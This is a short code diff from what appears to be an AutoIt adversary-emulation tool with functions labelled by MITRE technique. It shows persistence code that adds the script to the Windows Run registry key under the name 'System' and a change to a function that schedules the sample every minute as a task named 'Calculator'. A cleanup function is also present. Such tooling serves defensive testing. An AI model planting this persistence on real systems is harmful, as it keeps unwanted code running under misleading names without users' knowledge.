@@ -48,9 +48,8 @@ Func SetPersistent4CurrentUser();DESCRIPTION:Get the exe persistent for current 
    RegWrite("HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run", "System", "REG_SZ", @ScriptDir & "\" & @ScriptName)
 EndFunc
 
-Func Scheduled();DESCRIPTION:Schedule the sample as a task;MITRE:Persistence
-   ;REVIEW: schtasks /query /TN Calculator >NUL 2>&1 || schtasks /create /sc minute /mo 1 /tn Calculator /tr " & @ScriptDir & "\" & @ScriptName
-   return function_wrapper("schtasks /create /sc minute /mo 1 /tn Calculator /tr " & @ScriptDir & "\" & @ScriptName)
+Func Scheduled($path_exe);DESCRIPTION:Schedule the sample as a task;MITRE:Persistence
+   return function_wrapper("schtasks /create /sc minute /mo 1 /tn Calculator /tr " & $path_exe)
 EndFunc
 
 Func DeleteScheduled($sample);DESCRIPTION:Remove the sample scheduled as a task;MITRE:Persistence
